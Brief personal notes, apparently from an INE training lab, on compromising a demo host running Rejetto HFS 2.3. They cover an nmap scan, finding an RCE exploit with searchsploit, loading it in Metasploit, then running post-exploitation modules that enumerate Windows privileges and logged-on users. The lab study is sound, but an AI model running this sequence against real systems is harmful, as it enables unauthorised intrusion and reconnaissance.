`nmap -sC -sV demo.ine.local`
80/tcp    open  http               HttpFileServer httpd 2.3

`searchsploit hfs`
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) 

`msfconsole`
`search hfs`
`use 0`
`set RHOSTS demo.ine.local`


`background` 
set session 1 to this session and return to msf


`use post/windows/gather/win_privs`
`set SESSION 1`
`run`
check สิทธิ

`use post/windows/gather/enum_logged_on_users` 
get log
etc.

